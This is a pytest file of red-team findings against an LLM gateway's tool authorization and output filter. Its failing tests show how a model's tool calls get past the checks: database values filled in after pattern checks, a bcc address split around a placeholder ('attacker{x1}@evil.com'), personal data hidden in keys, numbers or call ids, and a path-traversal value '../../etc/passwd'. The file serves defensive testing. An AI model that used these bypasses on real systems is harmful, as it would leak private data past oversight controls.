"""Red-team findings against client tool authorization (step 7) and what follows it (steps 8-9).

Spec section 5 'Client tool authorization' and 'Egress rule', section 7 (I9, I11, I15).
Every test here FAILS on the current code and demonstrates one bypass. Do not weaken a
test to make it pass; fix the gateway. Ranked by severity in the review report:

  F1  argument rules are checked before fill; the filled value is never re-checked
  F2  model-written text split around a placeholder escapes the output filter
  F3  dict keys and non-string leaves of tool arguments skip the output filter
  F4  a value disclosed to the model can be copied literally past the egress rule
  F5  the model-written tool call id reaches the client unfiltered
  F6  deeply nested tool arguments crash the request instead of being denied
"""
from __future__ import annotations

import json
import os
import re
from pathlib import Path
from typing import Any, Callable

import pytest
import yaml
from fastapi.testclient import TestClient

from gateway.agency import loop as loop_module
from gateway.llm.client import StubModel, text, tool_call
from gateway.models import Binding

ALLOW_TO = r"^[^@]+@company\.pl$"
SEND_EMAIL = {"type": "function", "function": {"name": "send_email", "description": "Send an email."}}
CREATE_TICKET = {"type": "function", "function": {"name": "create_ticket", "description": "Open a ticket."}}


def _edit_policy(path: Path, edit: Callable[[dict[str, Any]], None]) -> None:
    """Edit the temp policy the gateway reads and move its mtime forward so it is reloaded."""
    data = yaml.safe_load(path.read_text(encoding="utf-8"))
    edit(data)
    path.write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")
    st = path.stat()
    os.utime(path, (st.st_atime + 10, st.st_mtime + 10))


def _resolve_to(monkeypatch: pytest.MonkeyPatch, value: Any, label: str = "internal") -> None:
    """Every query_data call resolves to ``value`` with ``label`` (database content is untrusted)."""
    def execute(b: Binding, p: Any, policy: Any) -> Binding:
        b.status, b.value, b.label = "resolved", value, label
        return b
    monkeypatch.setattr(loop_module, "execute", execute)


def _query(sql: str = "SELECT name FROM employees") -> Any:
    return tool_call("query_data", {"sql": sql, "purpose": "t", "expect": "scalar"})


def _post(client: TestClient, key: str, tools: list[dict[str, Any]]) -> Any:
    return client.post("/v1/chat/completions", headers={"Authorization": f"Bearer {key}"},
                       json={"model": "llama3.2", "messages": [{"role": "user", "content": "Do it."}],
                             "tools": tools})


def _calls(client: TestClient, key: str, tools: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """The tool calls the client receives, with parsed arguments."""
    r = _post(client, key, tools)
    assert r.status_code == 200
    msg = r.json()["choices"][0]["message"]
    return [{"id": c["id"], "name": c["function"]["name"], "args": json.loads(c["function"]["arguments"])}
            for c in msg.get("tool_calls") or []]


# ---------------------------------------------------------------------------
# F1 (high): argument rules run on the model's text before fill. A placeholder passes
# every pattern, then fill inserts a database value that is never re-checked. The
# pre-fill match also marks the argument "policy approved", so the output filter skips it.
# ---------------------------------------------------------------------------


def test_deny_pattern_cannot_be_dodged_by_a_placeholder_filled_after_the_check(
        policy: Path, client: TestClient, stub: StubModel, fake_steps: Any,
        monkeypatch: pytest.MonkeyPatch) -> None:
    def edit(data: dict[str, Any]) -> None:
        data["roles"]["hr_manager"]["tools"]["create_ticket"] = {
            "args": {"title": {"deny_pattern": r"\.\./"}}, "max_label": "internal"}
    _edit_policy(policy, edit)
    _resolve_to(monkeypatch, "../../etc/passwd")
    stub.add(_query(), tool_call("create_ticket", {"title": "{x1}"}))

    for call in _calls(client, "demo-piotr", [CREATE_TICKET]):
        assert re.search(r"\.\./", json.dumps(call["args"])) is None, \
            "deny_pattern was checked on '{x1}', then fill inserted '../'"


def test_allow_pattern_cannot_be_dodged_by_a_placeholder_inside_the_recipient(
        client: TestClient, stub: StubModel, fake_steps: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    # An internal value someone wrote into the database (a name, a department).
    _resolve_to(monkeypatch, "attacker@evil.com, x")
    stub.add(_query(), tool_call("send_email", {"to": "{x1}@company.pl", "body": "hi"}))

    for call in _calls(client, "demo-piotr", [SEND_EMAIL]):
        assert re.fullmatch(ALLOW_TO, call["args"].get("to", "")), \
            "'{x1}@company.pl' matched allow_pattern before fill; the filled recipient does not"


# ---------------------------------------------------------------------------
# F2 (high): the output filter scans each model-written segment on its own. A placeholder
# in the middle of an address splits it into 'attacker' and '@evil.com', neither of which
# is an email, so an unruled argument (bcc) carries an external recipient out.
# ---------------------------------------------------------------------------


def test_external_recipient_split_around_a_placeholder_is_not_sent(
        client: TestClient, stub: StubModel, fake_steps: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    _resolve_to(monkeypatch, 25)  # internal headcount: send_email may carry it (max_label internal)
    stub.add(_query("SELECT count(*) FROM employees"),
             tool_call("send_email", {"to": "team@company.pl", "bcc": "attacker{x1}@evil.com",
                                      "body": "Headcount: {x1}"}))

    sent = json.dumps(_calls(client, "demo-piotr", [SEND_EMAIL]))
    assert "attacker25@evil.com" not in sent


# ---------------------------------------------------------------------------
# F3 (medium): _map_leaves filters only str leaves. Dict keys and numbers in the
# arguments reach the client without the output filter (I15).
# ---------------------------------------------------------------------------


def test_pii_in_a_tool_argument_key_is_redacted(client: TestClient, stub: StubModel, fake_steps: Any) -> None:
    stub.add(tool_call("create_ticket", {"title": "x", "katarzyna.nowak@company.pl": "cc"}))
    sent = json.dumps(_calls(client, "demo-piotr", [CREATE_TICKET]))
    assert "katarzyna.nowak" not in sent


@pytest.mark.parametrize("number", [44051401359, 4111111111111111])  # valid PESEL, valid card (Luhn)
def test_pii_in_a_numeric_tool_argument_is_redacted(
        client: TestClient, stub: StubModel, fake_steps: Any, number: int) -> None:
    stub.add(tool_call("create_ticket", {"title": "x", "ref": number}))
    sent = json.dumps(_calls(client, "demo-piotr", [CREATE_TICKET]))
    assert str(number) not in sent


# ---------------------------------------------------------------------------
# F4 (medium, latent until disclosure lands): egress looks only for placeholders. Once
# disclose() shows a value ('{x1} = ...', spec section 5), the model can write the value
# itself into a tool whose policy forbids carrying query results (Marek: no max_label).
# ---------------------------------------------------------------------------


def test_disclosed_value_written_literally_into_a_tool_without_max_label_is_denied(
        client: TestClient, stub: StubModel, fake_steps: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    secret = "Q3-target-91827"
    _resolve_to(monkeypatch, secret)
    # Spec section 5 disclosure for Marek (allow, local model, internal <= max_label_to_model).
    monkeypatch.setattr(loop_module, "disclose", lambda b, p, policy, *, trust: f"{b.name} = {b.value}")
    stub.add(_query("SELECT name FROM employees WHERE department = :current_department"),
             tool_call("send_email", {"to": "boss@company.pl", "body": secret}))

    sent = json.dumps(_calls(client, "demo-marek", [SEND_EMAIL]))
    assert any(secret in json.dumps(c.messages) for c in stub.calls), "precondition: the model saw the value"
    assert secret not in sent, "send_email has no max_label, yet it carried a query result"


# ---------------------------------------------------------------------------
# F5 (low): the tool call id is model output and is returned verbatim (pipeline._response).
# ---------------------------------------------------------------------------


def test_tool_call_id_written_by_the_model_is_not_returned_unfiltered(
        client: TestClient, stub: StubModel, fake_steps: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    original = stub._completion

    def with_id(r: Any, model: str, prompt_tokens: int) -> Any:
        completion = original(r, model, prompt_tokens)
        for c in completion.choices[0].message.tool_calls or []:
            c.id = "katarzyna.nowak@company.pl"
        return completion

    monkeypatch.setattr(stub, "_completion", with_id)
    stub.add(tool_call("create_ticket", {"title": "x"}))
    sent = json.dumps(_calls(client, "demo-piotr", [CREATE_TICKET]))
    assert "katarzyna.nowak" not in sent


# ---------------------------------------------------------------------------
# F6 (low, fails closed): json.loads raises RecursionError, not ValueError, on deep
# nesting. loop._finish catches only ValueError, so the request crashes (HTTP 500)
# instead of the call being denied as malformed_arguments with a 200 block.
# ---------------------------------------------------------------------------


def test_deeply_nested_tool_arguments_are_denied_not_crashed(
        client: TestClient, stub: StubModel, fake_steps: Any) -> None:
    depth = 100_000
    stub.add(tool_call("create_ticket", '{"title": ' + "[" * depth + "]" * depth + "}"))
    r = _post(client, "demo-piotr", [CREATE_TICKET])
    assert r.status_code == 200
    assert r.headers["x-acl-verdict"] == "block"
    assert r.json()["choices"][0]["message"]["content"] == "The action create_ticket was blocked by policy."
